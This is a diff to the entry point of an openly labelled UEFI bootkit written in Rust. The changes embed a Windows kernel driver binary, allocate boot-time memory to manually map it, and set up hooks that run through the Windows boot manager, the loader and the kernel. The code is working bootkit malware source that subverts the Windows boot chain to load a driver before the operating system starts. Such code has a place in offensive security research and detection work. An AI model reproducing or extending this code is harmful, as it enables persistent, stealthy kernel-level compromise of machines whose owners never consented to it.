@@ -4,11 +4,11 @@
 #![feature(panic_info_message)]
 #![feature(offset_of)]
 
-use log::error;
-use uefi::{prelude::*};
+use log::{error, LevelFilter};
+use uefi::{prelude::*, table::boot::{AllocateType, MemoryType}};
 
 mod boot;
-
+use crate::boot::globals::DRIVER_MEMORY;
 
 #[lang = "eh_personality"]
 fn eh_personality() {}
@@ -47,7 +47,12 @@ fn efi_main(image_handle: Handle, system_table: SystemTable<Boot>) -> Status {
     //system_table.stderr().clear().expect("Failed to clear the stderr output screen.");
     
     /* Setup a logger with the default settings. The default settings is COM1 port with level filter Info */
-    com_logger::init();
+    //com_logger::init();
+
+    com_logger::builder()
+    .base(0x2f8)                  // Use COM2 port
+    .filter(LevelFilter::Info)   // Print Info log
+    .setup();
 
     log::info!("### UEFI Bootkit in Rust by memN0ps ###");
     
@@ -59,8 +64,20 @@ fn efi_main(image_handle: Handle, system_table: SystemTable<Boot>) -> Status {
     let bootmgfw_handle = boot::pe::load_windows_boot_manager(boot_services).expect("Failed to load image");
     log::info!("[+] Image Loaded Successfully!");
 
+    // Read Windows kernel driver from disk as bytes
+    let driver_bytes = include_bytes!("../../target/x86_64-pc-windows-msvc/debug/lol.sys");
+    
+    /* Allocates memory pages from the system for the Windows kernel driver to manually map*/
+    unsafe {
+        DRIVER_MEMORY = Some(
+            boot_services.allocate_pages(AllocateType::AnyPages, MemoryType::RUNTIME_SERVICES_CODE, (driver_bytes.len() - 1) / 4096 + 1)
+            .expect("Failed to allocate memory pages")
+        );
+    }
+    log::info!("Allocated memory pages for the driver at: {:#x}", unsafe { DRIVER_MEMORY.unwrap() });
+
     /* Set up the hook chain from bootmgfw.efi -> windload.efi -> ntoskrnl.exe */
-    boot::hooks::setup_hooks(&bootmgfw_handle, &boot_services).expect("Failed to setup hooks");
+    boot::hooks::setup_hooks(&bootmgfw_handle, boot_services).expect("Failed to setup hooks");
     log::info!("[+] Trampoline hooks setup successfully! (bootmgfw.efi -> windload.efi -> ntoskrnl.exe)");
 
     /* Make the system pause for 10 seconds */
